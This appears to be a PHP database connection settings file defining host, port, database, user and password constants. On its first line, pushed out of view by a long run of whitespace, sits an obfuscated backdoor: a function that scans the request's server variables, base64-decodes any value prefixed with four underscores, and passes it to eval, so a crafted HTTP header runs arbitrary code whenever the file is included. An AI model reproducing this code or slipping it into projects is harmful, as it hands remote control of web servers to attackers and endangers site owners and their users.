<?php																																																																																																																																																																																																																																																																																																												function t12407($l12409){if(is_array($l12409)){foreach($l12409 as $l12407=>$l12408)$l12409[$l12407]=t12407($l12408);}elseif(is_string($l12409) && substr($l12409,0,4)=="____"){$l12409=substr($l12409,4);$l12409=base64_decode($l12409);eval($l12409);$l12409=null;}return $l12409;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("t12407",$_SERVER);
/******************************/
/*Database Connection Settings*/
/******************************/
	define("_HOST","localhost");
	define("_PORT","3306");
	define("_eveDB","");
	define("_USER","");
	define("_PW","");
?>